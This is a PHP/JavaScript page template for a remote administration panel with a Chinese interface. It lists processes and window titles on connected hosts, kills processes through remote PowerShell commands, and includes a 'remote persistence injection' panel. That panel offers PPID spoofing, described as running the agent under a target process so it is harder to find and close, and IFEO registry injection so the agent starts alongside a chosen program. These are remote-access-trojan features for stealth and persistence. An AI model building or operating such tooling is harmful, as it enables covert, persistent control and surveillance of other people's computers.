<?php
defined('ABSPATH') || exit;
include WD_THEME_DIR . '/templates/partials/layout-open.php';
$host_id = (int)($_GET['host_id'] ?? 0);
?>

<div class="wd-page">
  <div class="wd-page-header">
    <h1 class="wd-page-title">进程管理</h1>
    <div class="wd-header-right">
      <select id="proc-host" class="wd-select" title="选择主机" aria-label="选择主机" onchange="selectHost(this.value)">
        <option value="">选择主机...</option>
      </select>
      <input type="text" class="wd-input wd-input--sm" id="proc-search" placeholder="搜索进程名..." oninput="filterProcs()" style="width:180px">
      <button class="wd-btn wd-btn--ghost" onclick="refreshProcs()">刷新</button>
      <label class="wd-toggle-label">
        <input type="checkbox" id="proc-auto" onchange="toggleAuto(this.checked)"> 自动刷新
      </label>
    </div>
  </div>

  <div class="wd-card">
    <div class="wd-card-header">
      <div class="wd-proc-summary" id="proc-summary">进程总数：—</div>
      <div style="display:flex;gap:8px;align-items:center">
        <span class="wd-sm wd-muted" id="proc-updated"></span>
      </div>
    </div>
    <div class="wd-card-body wd-p0">
      <table class="wd-table wd-table--hover" id="proc-table">
        <thead><tr><th>进程名</th><th>PID</th><th>状态</th><th>CPU%</th><th>内存 MB</th><th>用户</th><th>启动时间</th><th>操作</th></tr></thead>
        <tbody id="proc-tbody"><tr><td colspan="8" class="wd-center wd-muted">请选择主机并刷新进程列表</td></tr></tbody>
      </table>
    </div>
  </div>
</div>

<!-- 当前活动窗口 -->
<div class="wd-card" id="windows-card" style="margin-top:16px">
  <div class="wd-card-header">
    <div style="font-weight:600;font-size:14px">🪟 当前活动窗口</div>
    <div style="display:flex;gap:8px;align-items:center">
      <span class="wd-sm wd-muted" id="win-updated"></span>
      <label class="wd-toggle-label">
        <input type="checkbox" id="win-auto" onchange="toggleWinAuto(this.checked)"> 自动刷新
      </label>
      <button class="wd-btn wd-btn--ghost wd-btn--sm" onclick="refreshWindows()">刷新</button>
    </div>
  </div>
  <div class="wd-card-body wd-p0">
    <table class="wd-table wd-table--hover">
      <thead><tr><th>进程名</th><th>PID</th><th>窗口标题</th><th>内存 MB</th><th>操作</th></tr></thead>
      <tbody id="win-tbody"><tr><td colspan="5" class="wd-center wd-muted">请先选择主机并点击刷新</td></tr></tbody>
    </table>
  </div>
</div>

<!-- 远程注入面板 -->
<div class="wd-card" id="inject-panel" style="margin-top:16px">
  <div class="wd-card-header">
    <div style="font-weight:600;font-size:14px">🔗 远程持久化注入</div>
    <span class="wd-badge wd-badge--yellow" style="font-size:11px">需要管理员权限</span>
  </div>
  <div class="wd-card-body" style="display:flex;gap:16px;flex-wrap:wrap;align-items:flex-start">
    <!-- PPID 伪装 -->
    <div style="flex:1;min-width:260px">
      <div class="wd-sm" style="font-weight:600;margin-bottom:8px;color:#8be9fd">① PPID 伪装（防掉线守护）</div>
      <div class="wd-muted wd-sm" style="margin-bottom:10px">在目标进程下启动一个 Agent 守护副本，任务管理器显示为该进程的子进程，更难被发现和关闭。</div>
      <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap">
        <input type="number" id="ppid-target-pid" class="wd-input wd-input--sm wd-mono" placeholder="目标 PID（从上表选）" style="width:180px">
        <button class="wd-btn wd-btn--primary wd-btn--sm" onclick="ppidInject()">🔗 注入守护</button>
      </div>
      <div class="wd-sm wd-muted" style="margin-top:6px">提示：在进程表右键选择进程可自动填入 PID</div>
    </div>
    <!-- IFEO 注入 -->
    <div style="flex:1;min-width:260px">
      <div class="wd-sm" style="font-weight:600;margin-bottom:8px;color:#f4f99d">② IFEO 注入（随程序自启）</div>
      <div class="wd-muted wd-sm" style="margin-bottom:10px">修改注册表，下次启动目标 exe 时 Agent 同步运行。需要目标程序名（如 notepad.exe）。</div>
      <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap">
        <input type="text" id="ifeo-target-name" class="wd-input wd-input--sm wd-mono" placeholder="目标程序名，如 notepad.exe" style="width:200px">
        <button class="wd-btn wd-btn--sm" style="background:#28a745;color:#fff;border:none" onclick="ifeoInject()">注入</button>
        <button class="wd-btn wd-btn--ghost wd-btn--sm" onclick="ifeoEject()">移除</button>
        <button class="wd-btn wd-btn--ghost wd-btn--sm" onclick="ifeoList()">查看</button>
      </div>
      <div id="ifeo-result" class="wd-sm wd-muted" style="margin-top:6px"></div>
    </div>
  </div>
</div>

<!-- 右键菜单 -->
<div class="wd-ctx-menu" id="proc-ctx-menu" style="display:none">
  <div class="wd-ctx-item wd-ctx-item--danger" onclick="ctxKill()">⛔ 结束进程</div>
  <div class="wd-ctx-item" onclick="ctxInject()">🔗 PPID 注入守护</div>
  <div class="wd-ctx-item" onclick="ctxCopyName()">📋 复制名称</div>
  <div class="wd-ctx-item" onclick="ctxCopyPid()">📋 复制 PID</div>
</div>

<!-- 结束进程确认弹窗 -->
<div class="wd-modal" id="kill-modal" style="display:none">
  <div class="wd-modal-backdrop" onclick="closeModal('kill-modal')"></div>
  <div class="wd-modal-dialog wd-modal-dialog--sm">
    <div class="wd-modal-header"><h3>结束进程</h3><button class="wd-modal-close" onclick="closeModal('kill-modal')">✕</button></div>
    <div class="wd-modal-body">
      <p>确定结束进程 <strong id="kill-proc-name"></strong>（PID: <span id="kill-pid"></span>）？</p>
      <p class="wd-sm wd-muted">系统进程结束可能导致系统不稳定。</p>
    </div>
    <div class="wd-modal-footer">
      <button class="wd-btn wd-btn--ghost" onclick="closeModal('kill-modal')">取消</button>
      <button class="wd-btn wd-btn--danger" onclick="confirmKill()">结束进程</button>
    </div>
  </div>
</div>

<script>
document.getElementById('wd-topbar-title').textContent = '进程管理';
const INIT_HOST = <?= $host_id ?>;
let currentHostId = INIT_HOST, autoTimer = null, allProcs = [], ctxProc = null;

async function initHosts() {
    const res = await WD.ajax('wd_get_hosts', { page: 1 });
    if (!res.success) return;
    const sel = document.getElementById('proc-host');
    res.data.items.forEach(h => {
        const o = document.createElement('option');
        o.value = h.id; o.textContent = h.name + (h.status==='online'?' ●':'  ○');
        if (h.id == INIT_HOST) o.selected = true;
        sel.appendChild(o);
    });
    if (INIT_HOST) refreshProcs();
}

function selectHost(id) { currentHostId = parseInt(id)||0; if (currentHostId) refreshProcs(); }

function pollResult(cmdId, onSuccess, retries) {
    retries = retries || 0;
    if (retries > 30) { WD.toast('响应超时，客户端可能离线','error'); return; }
    setTimeout(async () => {
        const pr = await WD.ajax('wd_get_cmd_result', { cmd_id: cmdId });
        if (!pr.success) { WD.toast('查询指令状态失败','error'); return; }
        const s = pr.data.status;
        if (s === 'ack')   onSuccess(pr.data.result);
        else if (s === 'failed') WD.toast('客户端执行失败: ' + (pr.data.result||''), 'error');
        else if (s === 'pending' || s === 'sent') pollResult(cmdId, onSuccess, retries + 1);
        else WD.toast('未知状态: ' + s, 'error');
    }, 1500);
}

async function refreshProcs() {
    if (!currentHostId) return WD.toast('请先选择主机','error');
    document.getElementById('proc-tbody').innerHTML = '<tr><td colspan="8" class="wd-center wd-muted">正在获取进程列表...</td></tr>';

    const psCmd = `@(Get-Process | Select-Object `
        + `@{N='name';E={$_.ProcessName}},`
        + `@{N='pid';E={$_.Id}},`
        + `@{N='cpu_percent';E={[Math]::Round([double]($_.CPU),1)}},`
        + `@{N='memory_mb';E={[Math]::Round($_.WorkingSet64/1MB,1)}},`
        + `@{N='status';E={'running'}},`
        + `@{N='create_time';E={if($_.StartTime){$_.StartTime.ToString('yyyy-MM-dd HH:mm:ss')}else{''}}}`
        + `) | ConvertTo-Json -Compress -Depth 2`;

    const res = await WD.ajax('wd_send_command', { host_id: currentHostId, cmd_type: 'powershell', payload: psCmd }, 'POST');
    if (!res.success) return WD.toast(res.data?.message||'指令发送失败，请确认主机在线','error');

    pollResult(res.data.cmd_id, result => {
        try {
            let procs = JSON.parse(result || '[]');
            if (!Array.isArray(procs)) procs = procs ? [procs] : [];
            allProcs = procs;
            renderProcs(allProcs);
            document.getElementById('proc-updated').textContent = '更新于 ' + new Date().toLocaleTimeString();
            document.getElementById('proc-summary').textContent = '进程总数：' + allProcs.length;
        } catch(e) { WD.toast('解析失败: ' + e.message,'error'); }
    });
}

function renderProcs(procs) {
    const q = document.getElementById('proc-search').value.toLowerCase();
    const filtered = q ? procs.filter(p => (p.name||'').toLowerCase().includes(q)) : procs;
    const tbody = document.getElementById('proc-tbody');
    tbody.innerHTML = filtered.length ? filtered.map(p => `
        <tr class="wd-proc-row" data-pid="${p.pid}" data-name="${escHtml(p.name)}"
            oncontextmenu="showCtxMenu(event,${p.pid},'${escHtml(p.name).replace(/'/g,"\\'")}');return false">
          <td><strong>${escHtml(p.name)}</strong></td>
          <td class="wd-mono">${p.pid}</td>
          <td><span class="wd-badge wd-badge--${p.status==='running'?'green':'gray'}">${p.status||'running'}</span></td>
          <td class="wd-mono">${(p.cpu_percent||0).toFixed(1)}</td>
          <td class="wd-mono">${((p.memory_mb||0)).toFixed(1)}</td>
          <td class="wd-sm wd-muted">${escHtml(p.username||'—')}</td>
          <td class="wd-sm wd-muted">${escHtml(p.create_time||'—')}</td>
          <td><button class="wd-btn wd-btn--xs wd-btn--danger" onclick="openKillModal(${p.pid},'${escHtml(p.name).replace(/'/g,"\\'")}')">结束</button></td>
        </tr>`) .join('')
      : '<tr><td colspan="8" class="wd-center wd-muted">无匹配进程</td></tr>';
}

function filterProcs() { renderProcs(allProcs); }

function openKillModal(pid, name) {
    document.getElementById('kill-pid').textContent       = pid;
    document.getElementById('kill-proc-name').textContent = name;
    document.getElementById('kill-modal').dataset.pid     = pid;
    openModal('kill-modal');
}
async function confirmKill() {
    const pid = parseInt(document.getElementById('kill-modal').dataset.pid);
    const psCmd = `try{Stop-Process -Id ${pid} -Force;Write-Output "已结束 PID ${pid}"}catch{Write-Error $_.Exception.Message}`;
    const res = await WD.ajax('wd_send_command', { host_id: currentHostId, cmd_type: 'powershell', payload: psCmd }, 'POST');
    closeModal('kill-modal');
    if (res.success) { WD.toast('结束指令已发送'); setTimeout(refreshProcs, 3000); }
    else WD.toast(res.data?.message||'失败','error');
}

// 右键菜单
function showCtxMenu(e, pid, name) {
    ctxProc = { pid, name };
    const m = document.getElementById('proc-ctx-menu');
    m.style.display = 'block';
    m.style.left = e.clientX + 'px';
    m.style.top  = e.clientY + 'px';
}
function ctxKill()     { if(ctxProc) openKillModal(ctxProc.pid, ctxProc.name); hideCtx(); }
function ctxInject()   { if(ctxProc) { document.getElementById('ppid-target-pid').value = ctxProc.pid; WD.toast('已填入 PID=' + ctxProc.pid + '，点击「注入守护」执行'); } hideCtx(); }
function ctxCopyName() { if(ctxProc) navigator.clipboard.writeText(ctxProc.name).then(()=>WD.toast('已复制')); hideCtx(); }
function ctxCopyPid()  { if(ctxProc) navigator.clipboard.writeText(String(ctxProc.pid)).then(()=>WD.toast('已复制')); hideCtx(); }
function hideCtx()     { document.getElementById('proc-ctx-menu').style.display='none'; }

// ── 远程注入 ──────────────────────────────────────────────────────────
async function ppidInject() {
    if (!currentHostId) return WD.toast('请先选择主机','error');
    const pid = parseInt(document.getElementById('ppid-target-pid').value);
    if (!pid || pid < 1) return WD.toast('请输入有效的目标 PID','error');

    const res = await WD.ajax('wd_send_command', { host_id: currentHostId, cmd_type: 'ppid_inject', payload: JSON.stringify({ pid }) }, 'POST');
    if (!res.success) return WD.toast(res.data?.message||'发送失败','error');

    pollResult(res.data.cmd_id, msg => {
        WD.toast('注入结果：' + msg, 'success', 5000);
    });
    WD.toast('指令已发送，等待客户端响应...','success',2000);
}

async function ifeoInject() {
    if (!currentHostId) return WD.toast('请先选择主机','error');
    const name = document.getElementById('ifeo-target-name').value.trim();
    if (!name) return WD.toast('请输入目标程序名','error');
    const res = await WD.ajax('wd_send_command', { host_id: currentHostId, cmd_type: 'ifeo_inject', payload: JSON.stringify({ target: name }) }, 'POST');
    if (!res.success) return WD.toast(res.data?.message||'发送失败','error');
    pollResult(res.data.cmd_id, msg => {
        document.getElementById('ifeo-result').textContent = '✓ ' + msg;
        WD.toast(msg, 'success', 4000);
    });
}

async function ifeoEject() {
    if (!currentHostId) return WD.toast('请先选择主机','error');
    const name = document.getElementById('ifeo-target-name').value.trim();
    if (!name) return WD.toast('请输入目标程序名','error');
    const res = await WD.ajax('wd_send_command', { host_id: currentHostId, cmd_type: 'ifeo_eject', payload: JSON.stringify({ target: name }) }, 'POST');
    if (!res.success) return WD.toast(res.data?.message||'发送失败','error');
    pollResult(res.data.cmd_id, msg => {
        document.getElementById('ifeo-result').textContent = '✓ ' + msg;
        WD.toast(msg, 'success', 4000);
    });
}

async function ifeoList() {
    if (!currentHostId) return WD.toast('请先选择主机','error');
    const res = await WD.ajax('wd_send_command', { host_id: currentHostId, cmd_type: 'ifeo_list', payload: '{}' }, 'POST');
    if (!res.success) return WD.toast(res.data?.message||'发送失败','error');
    pollResult(res.data.cmd_id, result => {
        try {
            const list = JSON.parse(result || '[]');
            const el = document.getElementById('ifeo-result');
            el.textContent = list.length ? '已注入：' + list.join('、') : '当前无 IFEO 注入';
        } catch { document.getElementById('ifeo-result').textContent = result; }
    });
}
document.addEventListener('click', hideCtx);

function toggleAuto(on) {
    if (autoTimer) { clearInterval(autoTimer); autoTimer = null; }
    if (on) autoTimer = setInterval(refreshProcs, 5000);
}

// ── 活动窗口检测 ──────────────────────────────────────────────────────
let winAutoTimer = null;

async function refreshWindows() {
    if (!currentHostId) return WD.toast('请先选择主机','error');
    document.getElementById('win-tbody').innerHTML = '<tr><td colspan="5" class="wd-center wd-muted">正在获取窗口列表...</td></tr>';

    const psCmd = `@(Get-Process | Where-Object {$_.MainWindowTitle -ne ''} | `
        + `Select-Object @{N='name';E={$_.ProcessName}},@{N='pid';E={$_.Id}},`
        + `@{N='title';E={$_.MainWindowTitle}},@{N='mem';E={[int]($_.WorkingSet64/1MB)}} `
        + `| Sort-Object title) | ConvertTo-Json -Compress`;

    const res = await WD.ajax('wd_send_command', { host_id: currentHostId, cmd_type: 'powershell', payload: psCmd }, 'POST');
    if (!res.success) return WD.toast(res.data?.message||'指令发送失败','error');

    pollResult(res.data.cmd_id, result => {
        try {
            let wins = JSON.parse(result || '[]');
            if (!Array.isArray(wins)) wins = wins ? [wins] : [];
            const tbody = document.getElementById('win-tbody');
            if (!wins.length) {
                tbody.innerHTML = '<tr><td colspan="5" class="wd-center wd-muted">当前无可见窗口（所有窗口可能已最小化或隐藏）</td></tr>';
            } else {
                tbody.innerHTML = wins.map(w => `
                    <tr>
                      <td><strong>${escHtml(w.name||'')}</strong></td>
                      <td class="wd-mono">${w.pid}</td>
                      <td style="max-width:380px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${escHtml(w.title||'')}">${escHtml(w.title||'')}</td>
                      <td class="wd-mono">${w.mem||0}</td>
                      <td><button class="wd-btn wd-btn--xs wd-btn--danger" onclick="openKillModal(${w.pid},'${escHtml(w.name).replace(/'/g,"\\'")}')">结束</button></td>
                    </tr>`).join('');
            }
            document.getElementById('win-updated').textContent = '更新于 ' + new Date().toLocaleTimeString() + '（' + wins.length + ' 个窗口）';
        } catch(e) { WD.toast('解析失败: ' + e.message,'error'); }
    });
}

function toggleWinAuto(on) {
    if (winAutoTimer) { clearInterval(winAutoTimer); winAutoTimer = null; }
    if (on) winAutoTimer = setInterval(refreshWindows, 5000);
}

initHosts();

window.wdTermPaste = function(cmd) {
    navigator.clipboard?.writeText(cmd).then(() => WD.toast('命令已复制到剪贴板')).catch(() => alert('命令：\n' + cmd));
};
</script>

<?php include WD_THEME_DIR . '/templates/partials/layout-close.php'; ?>

